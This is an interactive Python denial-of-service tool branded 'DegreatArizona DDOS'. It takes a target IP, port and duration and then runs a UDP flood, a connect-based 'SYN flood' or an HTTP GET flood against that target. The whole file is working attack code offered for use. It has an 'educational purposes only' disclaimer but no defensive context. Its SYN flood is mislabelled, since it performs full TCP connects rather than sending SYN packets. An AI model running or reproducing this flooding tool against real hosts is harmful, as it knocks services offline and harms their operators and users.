#!/usr/bin/env python

import sys
import random
import os
import time
import socket
from termcolor import colored

# Constants
MAX_UDP_SIZE = 65507  # Maximum size of UDP payload

# Clear the terminal and print header
os.system("clear")
os.system("figlet DegreatArizona DDOS")

print()
print(colored("Author   : DegreatArizona", 'green'))
print(colored("Website  : https://degreatarizona.com", 'blue'))
print(colored("Github   : https://github.com/DegreatArizona", 'blue'))
print(colored("YouTube  : https://www.youtube.com/@DegreatArizona", 'blue'))
print(colored("LinkedIn : https://www.linkedin.com/in/degreatarizona", 'blue'))
print(colored("Twitter  : https://twitter.com/degreatarizona", 'blue'))
print(colored("This tool is written for educational purposes only :)", 'yellow'))
print(colored("Degreatarizona is not responsible for misusing it.", 'yellow'))
print()

# Input target IP, port, duration, and packet size
ip = input(colored("Input Target IP Address: ", 'green'))
try:
    port = int(input(colored("Input Target Port: ", 'green')))
except ValueError:
    print(colored("Error :( Port Does Not Exist.  Quitting...", 'blue'))
    sys.exit()

try:
    dur = int(input(colored("Input Your Attack Duration In Seconds: ", 'green')))
except ValueError:
    print(colored("Error :( Invalid Input.  Quitting...", 'blue'))
    sys.exit()

try:
    packet_size = int(input(colored(f"Input Packet Data Size In Bytes (up to {MAX_UDP_SIZE} bytes): ", 'green')))
    if packet_size <= 0 or packet_size > MAX_UDP_SIZE:
        raise ValueError
except ValueError:
    print(colored("Invalid Packet Data Size :( Exiting...", 'blue'))
    sys.exit()

# UDP Flood function
def udp_flood(ip, port, dur, packet_size):
    if packet_size > MAX_UDP_SIZE:
        print(colored(f"Error: Packet size exceeds the maximum allowed size of {MAX_UDP_SIZE} bytes. Adjusting size.", 'red'))
        packet_size = MAX_UDP_SIZE

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target = (ip, port)
    start_time = time.time()
    packet_count = 0

    print(colored("Starting UDP flood attack...", 'yellow'))

    while True:
        try:
            message = random._urandom(packet_size)
            s.sendto(message, target)
            packet_count += 1
            if packet_count % 100 == 0:  # Print status every 100 packets
                print(colored(f"Sent {packet_count} packets of size {packet_size} bytes", 'red'))
        except socket.error as e:
            print(colored(f"Socket error: {e}", 'red'))
            break
        except Exception as e:
            print(colored(f"Unexpected error: {e}", 'red'))
            break

        if time.time() - start_time >= dur:
            break

    s.close()
    print(colored(f"UDP Flood attack completed. Total packets sent: {packet_count}", 'green'))

# SYN Flood function
def syn_flood(ip, port, dur):
    sent = 0
    timeout = time.time() + dur
    while True:
        if time.time() > timeout:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((ip, port))
            sent += 1
            print(colored(f"SYN Packets Sent: {sent} To Target: {ip}", 'red'))
        except (socket.error, OSError) as e:
            print(colored(f"Socket error: {e}", 'red'))
        except KeyboardInterrupt:
            print(colored("\n[*] SYN ATTACK STOPPED", 'green'))
            sys.exit()
        finally:
            sock.close()

# HTTP Flood function
def http_flood(ip, port, dur):
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
    sent = 0
    timeout = time.time() + dur
    while True:
        if time.time() > timeout:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(colored(f"HTTP Packet Sent: {sent} to Target: {ip}", 'red'))
        except (socket.error, OSError) as e:
            print(colored(f"Socket error: {e}", 'red'))
        except KeyboardInterrupt:
            print(colored("\n[-] ATTACK STOPPED BY USER", 'green'))
            break
        finally:
            sock.close()

print()
attack_type = input(colored("Choose Flood Attack > \n 1. UDP Flood \n 2. SYN Flood \n 3. HTTP Flood \n Input Attack Choice: ", 'green'))

if attack_type == "1":
    print(colored("UDP Flood Attack selected", 'red'))
    udp_flood(ip, port, dur, packet_size)
    print(colored("UDP Flood Attack Completed :-)", 'green'))
elif attack_type == "2":
    print(colored("SYN Flood Attack Selected", 'red'))
    syn_flood(ip, port, dur)
    print(colored("SYN Flood Attack Completed :-)", 'green'))
elif attack_type == "3":
    print(colored("HTTP Flood Attack Selected", 'red'))
    http_flood(ip, port, dur)
    print(colored("HTTP Flood Attack Completed :-)", 'green'))
else:
    print(colored("Error :( Invalid Attack Type Exiting", 'red'))
    sys.exit()
